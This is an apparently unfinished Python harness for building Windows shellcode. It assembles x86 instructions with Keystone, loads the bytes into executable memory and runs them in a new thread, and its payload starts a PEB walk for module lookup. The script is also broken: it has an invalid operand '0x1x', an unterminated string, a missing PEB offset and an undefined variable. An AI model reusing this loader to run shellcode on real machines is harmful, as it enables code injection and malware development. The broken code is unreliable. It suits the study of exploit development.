from keystone import *
import sys
import ctypes, struct

def asm2shell(c):
    print("Generate shellcode ...")
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(c)
    sh = b""
    instructions = ""
    for e in encoding: 
        sh += struct.pack("B",e)
        instructions += "\\x{0:02x}".format(int(e)).rstrip("\n") 
    print("Shellcode size: %d bytes"%(count))
    shellcode = bytearray(sh)
    print("Shellcode: %s"%instructions)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


code = "int3;"
code += "xor ecx, ecx;" #
code += "mov esi, fs:[ecx];"
code += "mov esi, [esi + 0x0c];"
code += " mov esi, [esi + 0x1x];"

code += "next_module:"
code += "

asm2shell(asmCode)
